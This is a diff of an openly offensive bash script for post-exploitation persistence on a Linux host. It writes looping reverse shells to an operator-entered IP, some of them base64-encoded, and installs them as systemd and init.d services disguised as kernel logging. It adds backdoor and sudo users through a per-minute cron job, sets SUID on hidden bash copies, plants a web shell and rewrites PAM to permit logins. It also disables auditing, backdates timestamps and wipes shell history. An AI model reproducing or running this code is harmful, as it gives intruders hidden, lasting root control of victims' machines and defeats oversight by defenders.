@@ -10,12 +10,14 @@ echo "[*]Running as root, proceeding..."
 echo "Enter IP: "
 read IP
 #encode shell in base64
-OUTPUT=`echo  '/bin/bash -i >& /dev/tcp/'$IP'/4444 0>&1 &' | base64`
+SHELL="while :; do setsid bash -i &>/dev/tcp/'$IP'/4444 0>&1; sleep 120; done &>/dev/null &"
+OUTPUT=`echo -n $SHELL | base64`
 echo $OUTPUT
 #to decode the shell base64 -d <<< $OUTPUT | sh
 #block logging
 echo "[*]Blocking logging..."
 auditctl -e 0
+export HISTFILE=/dev/null
 #Add bad users
 echo "[*]Adding user hack3r"
 useradd -p $(openssl passwd -1 hack3r) hack3r
@@ -34,6 +36,7 @@ echo "[*]Adding SUID bit to backdoored bash shells..."
 chmod u+s /etc/bind-old
 chmod u+s /usr/share/home
 chmod u+s /home/.bash_lc
+chmod u+s /home/...
 #don't forget to use '-p' on the backdoored shell you stupid fuck
 #Add Powny shell to webroot
 $webroot=`grep -i 'DocumentRoot' /etc/apache2/sites-available/000-default.conf | sed 's/DocumentRoot //'`
@@ -55,7 +58,7 @@ echo '[Unit]
 Description=System service for logging  of GFP links, part of the Linux Kernel.
 [Service]
 Type=simple
-ExecStart=nc '$IP' 4444 -e /bin/bash &
+ExecStart=while :; do setsid bash -i &>/dev/tcp/'$IP'/977 0>&1; sleep 120; done &>/dev/null &
 [Install]
 WantedBy=multi-user.target' >> /etc/systemd/system/linuxdot.service
 touch -t 201512250100 /etc/systemd/system/linuxdot.service
@@ -63,8 +66,7 @@ systemctl enable linuxdot
 service linuxdot enable
 #Same but for initd
 echo "[*]Reverse shell on boot /etc/init.d/stdout.sh"
-echo '#!/bin/bash
-/bin/bash -i >& /dev/tcp/'$IP'/977 0>&1 &'>> /etc/init.d/stdout.sh
+echo 'while :; do setsid bash -i &>/dev/tcp/'$IP'/977 0>&1; sleep 120; done &>/dev/null &'>> /etc/init.d/stdout.sh
 chmod +x /etc/init.d/stdout.sh
 update-rc.d stdout.sh defaults
 touch -t 201504241142 /etc/init.d/stdout.sh
@@ -76,7 +78,8 @@ for user in `awk -F':' '{ print $1}' /etc/passwd` ; do
 done
 #TODO Establish ssh tunnel https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1
 #TODO poison the crontab
-echo "useradd -p $(openssl passwd -1 adm1n) adm1n && usermod -aG sudo adm1n">/opt/1
+$passwd=`openssl passwd -1 adm1n`
+echo "useradd -p $passwd adm1n && usermod -aG sudo adm1n">/opt/1
 chmod +x /opt/1
 crontab -l > mycron
 echo "* * * * * bash /opt/1" >> mycron
@@ -92,16 +95,16 @@ sudo chmod 700 /usr/local/bin/paramiko
 #TODO hack PAM to allow login without password
 sed -i 's/deny/permit/g' /etc/pam.d/common-auth
 #Remove iptables and UFW, and block them from being reinstalled
-echo "[*]Removing UFW/iptables and blocking their install"
-apt-get remove iptables --purge -y
-apt-get remove ufw --purge -y
-echo 'Package: iptables
-Pin: release *
-Pin-Priority: -1'>/etc/apt/preferences.d/iptables
-echo 'Package: ufw
-Pin: release *
-echo "[*]Clearing history..."
-Pin-Priority: -1'>/etc/apt/preferences.d/ufw
+#echo "[*]Removing UFW/iptables and blocking their install"
+#apt-get remove iptables --purge -y
+#apt-get remove ufw --purge -y
+#echo 'Package: iptables
+#Pin: release *
+#Pin-Priority: -1'>/etc/apt/preferences.d/iptables
+#echo 'Package: ufw
+#Pin: release *
+#echo "[*]Clearing history..."
+#Pin-Priority: -1'>/etc/apt/preferences.d/ufw
 #Clear history
 cat /dev/null > ~/.bash_history && history -c && history -w
 echo "[*]Done!"
